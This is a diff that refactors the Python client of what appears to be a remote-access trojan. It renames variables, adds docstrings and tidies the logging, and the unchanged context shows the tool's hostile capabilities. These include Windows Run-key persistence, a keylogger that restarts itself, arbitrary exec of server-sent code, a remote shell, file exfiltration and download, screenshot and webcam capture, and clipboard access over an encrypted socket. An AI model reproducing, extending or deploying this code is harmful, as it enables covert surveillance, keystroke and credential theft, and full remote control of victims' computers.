@@ -1,3 +1,4 @@
+""" Imports """
 import getpass
 import json
 import logging
@@ -37,9 +38,9 @@ if platform.system() == 'Windows':
 
 try:
     from pynput.keyboard import Listener
-    _pynput = True
+    _PYNPUT = True
 except Exception:
-    _pynput = False
+    _PYNPUT = False
 
 logging.basicConfig(filename=LOG, level=logging.INFO, format='%(asctime)s: %(message)s')
 logging.info('Client Started.')
@@ -61,15 +62,15 @@ def reverse_readline(filename: str, buf_size: int = 16384) -> str:
 
     # Credit: https://stackoverflow.com/a/23646049/10625567
 
-    with open(filename) as fh:
+    with open(filename) as _file:
         segment = None
         offset = 0
-        fh.seek(0, os.SEEK_END)
-        file_size = remaining_size = fh.tell()
+        _file.seek(0, os.SEEK_END)
+        file_size = remaining_size = _file.tell()
         while remaining_size > 0:
             offset = min(file_size, offset + buf_size)
-            fh.seek(file_size - offset)
-            buffer = fh.read(min(remaining_size, buf_size))
+            _file.seek(file_size - offset)
+            buffer = _file.read(min(remaining_size, buf_size))
             remaining_size -= buf_size
             lines = buffer.split('\n')
             if segment is not None:
@@ -85,19 +86,21 @@ def reverse_readline(filename: str, buf_size: int = 16384) -> str:
             yield segment
 
 
-def errors(ERROR: Exception, line: bool = True) -> str:
+def errors(error: Exception, line: bool = True) -> str:
     """ Error Handler """
-    error_class = ERROR.__class__.__name__
+    error_class = error.__class__.__name__
     error_msg = f'{error_class}:'
     try:
-        error_msg += f' {ERROR.args[0]}'
-    except Exception: pass
+        error_msg += f' {error.args[0]}'
+    except (IndexError, AttributeError):
+        pass
     if line:
         try:
-            _, _, tb = sys.exc_info()
-            line_number = traceback.extract_tb(tb)[-1][1]
+            _, _, traceb = sys.exc_info()
+            line_number = traceback.extract_tb(traceb)[-1][1]
             error_msg += f' (line {line_number})'
-        except Exception: pass
+        except Exception:
+            pass
     return error_msg
 
 
@@ -107,15 +110,16 @@ def add_startup() -> list:
     if platform.system() != 'Windows':
         return [False, 'Startup feature is only for Windows']
     if getattr(sys, 'frozen', False):
-        PATH = sys.executable
+        path = sys.executable
     elif __file__:
-        PATH = os.path.abspath(__file__)
+        path = os.path.abspath(__file__)
     try:
-        key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
-        SetValueEx(key, STARTUP_REG_NAME, 0, REG_SZ, PATH)
+        key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0, KEY_ALL_ACCESS)
+        SetValueEx(key, STARTUP_REG_NAME, 0, REG_SZ, path)
         CloseKey(key)
-    except Exception as e:
-        return [False, errors(e)]
+    except Exception as error:
+        return [False, errors(error)]
     logging.info('Added Client to Startup')
     return [True, None]
 
@@ -126,15 +130,16 @@ def remove_startup() -> list:
     if platform.system() != 'Windows':
         return [False, 'Startup feature is only for Windows.']
     try:
-        key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
+        key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0, KEY_ALL_ACCESS)
         DeleteValue(key, STARTUP_REG_NAME)
         CloseKey(key)
     except FileNotFoundError:
         # File was never registered.
         # Still returns True, since it's not in startup
         pass
-    except WindowsError as e:
-        return [False, errors(e)]
+    except WindowsError as error:
+        return [False, errors(error)]
     logging.info('Removed Client from Startup')
     return [True, None]
 
@@ -147,54 +152,56 @@ def kill(pid: int) -> None:
     process.kill()
 
 
-def OnKeyboardEvent(event):
-    logging.info(f"{event}")
+def onkeyboardevent(event):
+    """ On Keyboard Event"""
+    logging.info("%s", event)
 
-if _pynput:
-    KeyListener = Listener(on_press=OnKeyboardEvent)
+if _PYNPUT:
+    KeyListener = Listener(on_press=onkeyboardevent)
     # Check the state of the keylogger from logs
     if os.path.isfile(LOG):
-        for line in reverse_readline(LOG):
-            if 'Started Keylogger' in line:
+        for _line in reverse_readline(LOG):
+            if 'Started Keylogger' in _line:
                 KeyListener.start()
                 break
-            if 'Stopped Keylogger' in line:
+            if 'Stopped Keylogger' in _line:
                 break
 
 
 class Client(object):
+    """ Client Object """
 
     def __init__(self, key: bytes, host: str = '127.0.0.1', port: int = 8000) -> None:
-        self.serverHost = host
-        self.serverPort = port
+        self.serverhost = host
+        self.serverport = port
         self.socket = None
-        self.Fer = Fernet(key)
+        self.fer = Fernet(key)
         if platform.system() == 'Windows':
             self._pwd = ' & cd'
         else:
             self._pwd = '; pwd'
 
     def connect(self) -> None:
-        """ Connect to a remote socket using RSA and agreeing on a AES key"""
+        """ Connect to a remote socket """
         try:
             self.socket = socket.socket()
-            self.socket.connect((self.serverHost, self.serverPort))
+            self.socket.connect((self.serverhost, self.serverport))
         except (ConnectionRefusedError, TimeoutError):
             raise
-        except Exception as e:
-            logging.error(errors(e))
+        except Exception as error:
+            logging.error(errors(error))
             raise
         try:
             self.socket.send(socket.gethostname().encode())
-        except Exception as e:
-            logging.error(errors(e))
+        except socket.error as error:
+            logging.error(errors(error))
 
-    def recvall(self, n: int) -> bytes:
+    def recvall(self, byteamount: int) -> bytes:
         """ Function to receive n amount of bytes"""
         # returns bytes/None
         data = b''
-        while len(data) < n:
-            data += self.socket.recv(n - len(data))
+        while len(data) < byteamount:
+            data += self.socket.recv(byteamount - len(data))
         return data
 
     def receive(self) -> bytes:
@@ -202,12 +209,12 @@ class Client(object):
         # returns bytes
         buffer = int(self.socket.recv(2048).decode())
         self.socket.send(b'RECEIVED')
-        return self.Fer.decrypt(self.recvall(buffer))
+        return self.fer.decrypt(self.recvall(buffer))
 
     def send(self, data: bytes) -> None:
         """ Sends Buffer Size and Data to Server Encrypted with AES """
         # returns None
-        encrypted = self.Fer.encrypt(data)
+        encrypted = self.fer.encrypt(data)
         self.socket.send(f"{len(encrypted)}".encode())
         self.socket.recv(1024)
         self.socket.send(encrypted)
@@ -217,13 +224,14 @@ class Client(object):
         self.send(json.dumps(data).encode())
 
     def check_perms(self, _file: str, mode: str) -> bool:
+        """ Check permissions to a file """
         try:
             with open(_file, mode):
                 pass
-        except Exception as e:
+        except Exception as error:
             self.send(b'FILE_TRANSFER_ERROR')
             self.receive()
-            self.send(errors(e).encode())
+            self.send(errors(error).encode())
             return False
         return True
 
@@ -238,7 +246,7 @@ class Client(object):
         self.send(b'FILE_TRANSFER_DONE')
         self.receive()
         self.send(b'File Transferred Successfully')
-        logging.info(f'Transferred {file_to_transfer} to Server')
+        logging.info('Transferred %s to Server', file_to_transfer)
         return
 
     def receive_file(self, save_as: str) -> None:
@@ -255,7 +263,7 @@ class Client(object):
                     break
                 f.write(data)
                 self.send(b'RECEIVED')
-        logging.info(f'Transferred {save_as} to Client')
+        logging.info('Transferred %s to Client', save_as)
         return
 
     def receive_commands(self) -> None:
@@ -293,8 +301,8 @@ class Client(object):
                 error = None
                 try:
                     exec(data[1])
-                except Exception as e:
-                    error = errors(e, line=False)
+                except Exception as err:
+                    error = errors(err, line=False)
                 finally:
                     sys.stdout = old_stdout
                 self.send_json([redirected_output.getvalue(), error])
@@ -352,45 +360,45 @@ class Client(object):
                 continue
 
             if data[0] == 'ZIP_FILE':
-                logging.info(f'Zipping File: {data[2]}')
+                logging.info('Zipping File: %s', data[2])
                 try:
                     with ZipFile(data[1], 'w') as ziph:
                         ziph.write(data[2])
-                except Exception as e:
-                    self.send_json([False, errors(e)])
+                except Exception as err:
+                    self.send_json([False, errors(err)])
                     continue
                 self.send_json([True, None])
                 continue
 
             if data[0] == 'ZIP_DIR':
-                logging.info(f'Zipping Folder: {data[2]}')
+                logging.info('Zipping Folder: %s', data[2])
                 try:
                     shutil.make_archive(data[1], 'zip', data[2])
-                except Exception as e:
-                    self.send_json([False, errors(e)])
+                except Exception as err:
+                    self.send_json([False, errors(err)])
                     continue
                 self.send_json([True, None])
                 continue
 
             if data[0] == 'UNZIP':
-                logging.info(f'Unzipping: {data[1]}')
+                logging.info('Unzipping: %s', data[1])
                 try:
                     with ZipFile(data[1], 'r') as ziph:
                         ziph.extractall()
-                except Exception as e:
-                    self.send_json([False, errors(e)])
+                except Exception as err:
+                    self.send_json([False, errors(err)])
                     continue
                 self.send_json([True, None])
                 continue
 
             if data[0] == 'DOWNLOAD':
-                logging.info(f'Downloading "{data[2]}" from {data[1]}')
+                logging.info('Downloading "%s" from %s', data[2], data[1])
                 try:
                     r = requests.get(data[1])
                     with open(data[2], 'wb') as f:
                         f.write(r.content)
-                except Exception as e:
-                    self.send_json([False, errors(e, line=False)])
+                except Exception as err:
+                    self.send_json([False, errors(err, line=False)])
                     continue
                 self.send_json([True, None])
                 continue
@@ -408,20 +416,20 @@ class Client(object):
                         img = pyscreeze.screenshot()
                         img.save(output, format='PNG')
                         content = output.getvalue()
-                except Exception as e:
+                except Exception as err:
                     self.send(b'ERROR')
                     self.receive()
-                    self.send(errors(e).encode())
+                    self.send(errors(err).encode())
                     continue
                 self.send(content)
                 continue
 
             if data[0] == 'WEBCAM':
                 logging.info('Capturing Webcam')
-                vc = cv2.VideoCapture(0)
-                s, img = vc.read()
-                vc.release()
-                if s:
+                camera = cv2.VideoCapture(0)
+                state, img = camera.read()
+                camera.release()
+                if state:
                     is_success, arr = cv2.imencode('.png', img)
                     if is_success:
                         self.send(arr.tobytes())
@@ -431,7 +439,7 @@ class Client(object):
                 continue
 
             if data[0] == 'START_KEYLOGGER':
-                if not _pynput:
+                if not _PYNPUT:
                     self.send_json(False)
                     continue
                 if not KeyListener.running:
@@ -441,14 +449,14 @@ class Client(object):
                 continue
 
             if data[0] == 'KEYLOGGER_STATUS':
-                if not _pynput or not KeyListener.running:
+                if not _PYNPUT or not KeyListener.running:
                     self.send_json(False)
                     continue
                 self.send_json(True)
                 continue
 
             if data[0] == 'STOP_KEYLOGGER':
-                if not _pynput:
+                if not _PYNPUT:
                     self.send_json(False)
                     continue
                 if KeyListener.running:
@@ -462,15 +470,15 @@ class Client(object):
                 try:
                     pyperclip.copy(data[1])
                     self.send_json([True, None])
-                except Exception as e:
-                    self.send_json([False, errors(e)])
+                except Exception as err:
+                    self.send_json([False, errors(err)])
                 continue
 
             if data[0] == 'PASTE':
                 try:
                     self.send_json([True, pyperclip.paste()])
-                except Exception as e:
-                    self.send_json([False, errors(e)])
+                except Exception as err:
+                    self.send_json([False, errors(err)])
                 continue
 
             if data[0] == 'SHELL':
@@ -506,21 +514,21 @@ class Client(object):
                 continue
 
 
-def main(KEY: bytes, RETRY_TIMER: int = 10) -> None:
+def main(key: bytes, retry_timer: int = 10) -> None:
     """ Run Client """
     # RETRY_TIMER: Time to wait before trying to reconnect
-    client = Client(KEY)
+    client = Client(key)
     while True:
         try:
             client.connect()
-        except:
-            time.sleep(RETRY_TIMER)
+        except Exception:
+            time.sleep(retry_timer)
         else:
             break
     try:
         client.receive_commands()
-    except Exception as e:
-        logging.critical(errors(e))
+    except Exception as err:
+        logging.critical(errors(err))
 
 
 if __name__ == '__main__':
